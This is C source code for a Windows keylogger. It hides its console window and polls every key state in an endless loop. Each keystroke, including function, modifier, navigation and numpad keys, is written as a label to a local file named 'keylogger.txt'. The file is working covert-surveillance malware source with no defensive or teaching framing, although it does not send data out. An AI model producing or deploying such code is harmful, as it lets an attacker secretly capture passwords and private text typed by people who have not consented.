#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function to save a message to the file
void save_to(const char *filename, const char *message) {
    FILE *fp = fopen(filename, "a");
    if (fp == NULL) return;
    fprintf(fp, "%s", message);
    fclose(fp);
}

int main() {
    HWND hwnd = GetConsoleWindow();   // Get the console window handle
    ShowWindow(hwnd, SW_HIDE);        // Hide the window

    char message[16]; // Buffer to hold the message

    while (1) {
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0x0001) {  // Check if key is pressed or released
                switch (i) {
                    // Alphanumeric keys
                    case 'A' ... 'Z':
                    case '0' ... '9':
                        snprintf(message, sizeof(message), "%c", i); // For alphanumeric characters
                        break;

                    // Function keys
                    case VK_F1:  strcpy(message, "[F1]");  break;
                    case VK_F2:  strcpy(message, "[F2]");  break;
                    case VK_F3:  strcpy(message, "[F3]");  break;
                    case VK_F4:  strcpy(message, "[F4]");  break;
                    case VK_F5:  strcpy(message, "[F5]");  break;
                    case VK_F6:  strcpy(message, "[F6]");  break;
                    case VK_F7:  strcpy(message, "[F7]");  break;
                    case VK_F8:  strcpy(message, "[F8]");  break;
                    case VK_F9:  strcpy(message, "[F9]");  break;
                    case VK_F10: strcpy(message, "[F10]"); break;
                    case VK_F11: strcpy(message, "[F11]"); break;
                    case VK_F12: strcpy(message, "[F12]"); break;

                    // Modifier keys
                    case VK_SHIFT:     strcpy(message, "[Shift]");     break;
                    case VK_CONTROL:   strcpy(message, "[Ctrl]");      break;
                    case VK_MENU:      strcpy(message, "[Alt]");       break;
                    case VK_CAPITAL:   strcpy(message, "[CapsLock]");  break;
                    case VK_NUMLOCK:   strcpy(message, "[NumLock]");   break;
                    case VK_SCROLL:    strcpy(message, "[ScrollLock]"); break;

                    // Navigation keys
                    case VK_LEFT:      strcpy(message, "[Left]");      break;
                    case VK_RIGHT:     strcpy(message, "[Right]");     break;
                    case VK_UP:        strcpy(message, "[Up]");        break;
                    case VK_DOWN:      strcpy(message, "[Down]");      break;
                    case VK_HOME:      strcpy(message, "[Home]");      break;
                    case VK_END:       strcpy(message, "[End]");       break;
                    case VK_PRIOR:     strcpy(message, "[PageUp]");    break;
                    case VK_NEXT:      strcpy(message, "[PageDown]");  break;
                    case VK_INSERT:    strcpy(message, "[Insert]");    break;
                    case VK_DELETE:    strcpy(message, "[Delete]");    break;

                    // Special keys
                    case VK_BACK:      strcpy(message, "[Backspace]"); break;
                    case VK_TAB:       strcpy(message, "[Tab]");       break;
                    case VK_RETURN:    strcpy(message, "[Enter]");     break;
                    case VK_SPACE:     strcpy(message, " ");           break;
                    case VK_ESCAPE:    strcpy(message, "[Escape]");    break;
                    case VK_SNAPSHOT:  strcpy(message, "[PrintScreen]"); break;

                    // Numpad keys
                    case VK_NUMPAD0:   strcpy(message, "0");           break;
                    case VK_NUMPAD1:   strcpy(message, "1");           break;
                    case VK_NUMPAD2:   strcpy(message, "2");           break;
                    case VK_NUMPAD3:   strcpy(message, "3");           break;
                    case VK_NUMPAD4:   strcpy(message, "4");           break;
                    case VK_NUMPAD5:   strcpy(message, "5");           break;
                    case VK_NUMPAD6:   strcpy(message, "6");           break;
                    case VK_NUMPAD7:   strcpy(message, "7");           break;
                    case VK_NUMPAD8:   strcpy(message, "8");           break;
                    case VK_NUMPAD9:   strcpy(message, "9");           break;
                    case VK_ADD:       strcpy(message, "+");           break;
                    case VK_SUBTRACT:  strcpy(message, "-");           break;
                    case VK_MULTIPLY:  strcpy(message, "*");           break;
                    case VK_DIVIDE:    strcpy(message, "/");           break;
                    case VK_DECIMAL:   strcpy(message, ".");           break;

                    // Windows keys
                    case VK_LWIN:      strcpy(message, "[Left Windows]"); break;
                    case VK_RWIN:      strcpy(message, "[Right Windows]"); break;

                    // Unsupported keys
                    default: strcpy(message, "[Unknown Key]"); break;
                }

                save_to("keylogger.txt", message); // Save the message to the file
            }
        }
        Sleep(10); // Reduce CPU usage
    }

    return 0;
}
